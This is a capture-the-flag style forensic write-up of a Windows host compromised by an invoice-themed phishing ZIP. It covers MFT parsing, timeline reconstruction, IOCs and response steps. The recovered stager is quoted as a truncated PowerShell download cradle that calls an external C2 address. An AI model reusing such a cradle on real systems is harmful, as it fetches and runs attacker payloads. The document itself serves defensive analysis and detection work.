# BFT Sherlock: MFT Forensics Write-Up

## Overview
This write up covers my analysis of a Windows endpoint (`simon.stark`) that was compromised through a phishing-delivered ZIP archive. The archive extracted to a malicious batch file (`invoice.bat`) which then reached out to an external C2 server. I used MFT (Master File Table) forensics to trace the whole chain from download to execution to C2, using the `$MFT` file provided in the lab.
Tools I used: MFTECmd, grep, strings, xxd, and awk. Since I was working on Linux, I used command-line equivalents of Timeline Explorer and HxD rather than the GUI tools.
---
## Section 1: Scenario
The alert flagged a suspicious archive download followed by batch-file execution on host `simon.stark`, with a possible outbound connection to an external C2 server.
This looked like a textbook phishing-delivered stager: a ZIP disguised as an invoice extracts to a `.bat` file, which then uses PowerShell to reach attacker infrastructure. It's a common initial-access pattern for multi-stage infections.
The `$MFT` is valuable here because it keeps file metadata (names, timestamps, parent paths, and even the content of small files) long after the files themselves are deleted or logs get wiped. That lets me reconstruct exactly what happened on disk.
My goal was to trace the attack from download to execution to C2.

---
## Section 2: Initial Triage
First thing I did was parse the raw `$MFT` into a CSV so I could query it easily.
```bash
MFTECmd.exe -f "C:\Users\CyberJunkie\Desktop\C\$MFT" --csv "C:\Users\CyberJunkie\Desktop\" --csvf MFT_ANALYSIS.csv
```
Since I was on Linux, I worked with `mft_analysis.csv` directly using `grep`, `strings`, and `awk` instead of opening it in Timeline Explorer.
I prioritized four things and here's why:
1. `.zip` files under `C:\Users\*\Downloads`, since this is the most common delivery vector and users download archives all the time.
2. `.bat`, `.ps1`, and `.exe` files in user-writable paths, since these are the most likely payloads after extraction.
3. `Zone.Identifier` ADS records, since these prove a file came from the internet and often reveal the source URL.
4. Parent paths, since these trace the extraction chain from ZIP to folder to payload.

The key findings:
- Downloaded ZIP: `Stage-20240213T093324Z-001.zip`
- Source URL (Zone.Identifier): `https://storage.googleapis.com/drive-bulk-export-anonymous/...`
- Extraction path: `C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\`
- Suspicious payload: `invoice.bat`
- MFT EntryNumber: `23436`

The commands I used:
```bash
grep -a -i "Zone.Identifier" mft_analysis.csv
grep -a -i "invoice.bat" mft_analysis.csv
```
What I concluded from triage: a ZIP was downloaded from an external Google Storage bucket into `simon.stark`'s Downloads folder, extracted into an `invoice`-themed directory, and produced a batch file. That's a textbook invoice-phishing stager, so I escalated to a full investigation.

## Section 3: Investigation
### 3.1 File Identification and Timeline
From the `invoice.bat` MFT row (`EntryNumber 23436`), I pulled:
- Full path: `C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat`
- `$Created0x30` (file creation on disk): `2024-02-13 16:38:39.9341326`

The `0x30` timestamp comes from the `$FILE_NAME` attribute, which is harder to tamper with than `$STANDARD_INFORMATION` (`0x10`). That makes it the more reliable indicator for when a file actually landed on disk.
The timeline I reconstructed:
- `2024-02-13 16:38:39`: `invoice.bat` created on disk
- `2024-02-13 16:38:41`: File modified/accessed (execution likely)
- `2024-02-13 17:23:16`: Later MFT activity on the file

### 3.2 Hex Offset of the MFT Record
Each MFT record is 1024 bytes, so the disk offset for this record is:
```
offset = EntryNumber × 1024 = 23436 × 1024 = 24000512 = 0x16E3000
```
I verified it with:
```bash
xxd -s 0x16E3000 -l 64 '$MFT'
```

The output started with `4649 4C45`, which is the `FILE` signature, and that confirmed I was on the right record.
### 3.3 Recovering the Resident File Content (the Stager)
`invoice.bat` is smaller than 1024 bytes, so Windows stores its content directly inside the MFT record. It's a resident file, which means the malicious code survives even if the file is deleted from disk.
Dumping strings at that offset revealed the PowerShell stager:
```powershell
iwr('http://43.204.110.203:6666/...')
```
- `iwr` = `Invoke-WebRequest` (a PowerShell download cradle)
- C2 IP:PORT = `43.204.110.203:6666`

What I had as evidence at this point:
- Malicious file: `invoice.bat`
- Created (`$Created0x30`): `2024-02-13 16:38:39`
- MFT offset: `0x16E3000`
- Resident payload: PowerShell `iwr` to C2
- C2 endpoint: `43.204.110.203:6666`

---
## Section 4: Verdict
True positive, malicious.
Here's the reasoning:
- The ZIP came from an external Google Storage bucket, which isn't a trusted corporate source. Anonymous bulk-export URLs are a common way to stage payloads.
- It extracted to an `invoice`-themed folder, which is a classic invoice-phishing lure designed to socially engineer the user.
- The payload was `invoice.bat`. Legitimate invoices are PDFs or documents, never `.bat` scripts.
- The batch file ran PowerShell `iwr` to `43.204.110.203:6666`, a hard-coded external IP on a non-standard port. No business process does that.
- It was resident in the MFT, so it's a small stager designed to run quickly and quietly.

This is a stage-1 stager, most likely the entry point for a multi-stage infection (Cobalt Strike beacon, commodity RAT, or a loader). The `.bat` reaches out to the C2 to pull down the next payload.
There's no legitimate explanation for an invoice-themed `.bat` that calls `iwr` to a raw external IP on port 6666. This is confirmed malicious activity.

## Section 5: Action Taken
Decision: escalate and isolate.
Immediate response (containment):
1. Isolate host `simon.stark` from the network to cut C2 communication and prevent lateral movement.
2. Block `43.204.110.203:6666` at the perimeter firewall, proxy, and DNS sinkhole.
3. Reset the user's credentials, since PowerShell stagers often exfiltrate or harvest tokens.
Evidence preservation (before cleanup):
4. Export the `$MFT` and preserve it as forensic evidence with a proper chain of custody.
5. Collect PowerShell logs: Script Block Logging (Event ID 4104) and Module Logging (4103). These often contain the full stager content even after execution.
6. Collect Sysmon logs: Event ID 1 (process create), 3 (network connect), and 11 (file create) to build the full execution chain.
7. Capture the EDR process tree showing `invoice.bat` → `cmd.exe` → `powershell.exe` parent-child relationships.
Hunt (scope the incident):
8. Fleet-wide IOC hunt for traffic to `43.204.110.203` on any port, files named `Stage-*invoice*.bat`, ZIPs matching `Stage-20240213T093324Z-001.zip`, and `Zone.Identifier` ADS with the same `HostUrl`.
9. Check other users who may have received the same phishing lure via email gateway, Teams, or browser history.
Communication:
10. Notify the user and confirm the delivery method (email, Teams, browser download) to identify the initial vector.
11. Escalate to the IR team if additional hosts are compromised.
12. Document everything for the incident report.

## Section 6: Lesson Learned
What went wrong (detection gaps):
1. No blocking of script execution from Downloads. A user freely downloaded a ZIP and ran a `.bat` with no restriction. ASR rules should be deployed to block execution of potentially obfuscated scripts, block Office/script child processes, and block executable content from email and webmail.
2. No alert on internet-zone executables. Files with `Zone.Identifier = ZoneId=3` in user-writable paths (`.bat`, `.ps1`, `.lnk`, `.exe`) should trigger a high-priority alert.
3. PowerShell download cradles weren't flagged. `iwr` / `Invoke-WebRequest` to raw external IPs should be detected through Script Block Logging and AMSI.
What I'd do differently next time:
- Correlate MFT with Sysmon by pulling Event ID 1, 3, and 11 alongside MFT timestamps to build one unified timeline.
- Check `Zone.Identifier` early, since it's the fastest way to trace the delivery source. I'd do this in the first two minutes.
- Hunt resident MFT files proactively. Small `.bat`/`.ps1` files are invisible to disk scanners but recoverable from `$MFT`, so this belongs in the IR playbook.
- Check adjacent files. Always look at siblings in the same folder (`Stage-20240213T093324Z-001\Stage\invoice\invoices\`), since there may be additional payloads.
- Validate `$FILE_NAME` over `$STANDARD_INFORMATION`. The `0x30` timestamps are harder to tamper with, so I'd use them as ground truth when timelines conflict.
The main forensic takeaway: resident MFT files preserve their full content even after deletion. Always check `$MFT` before assuming a file is gone, because the attacker can delete the file but the MFT record stays until it's overwritten.
From a detection engineering angle, this incident gives three concrete detection opportunities: alert on `Zone.Identifier` ADS attached to script files, alert on `iwr`/`Invoke-WebRequest` to raw IPs, and alert on `.bat` execution from Downloads.
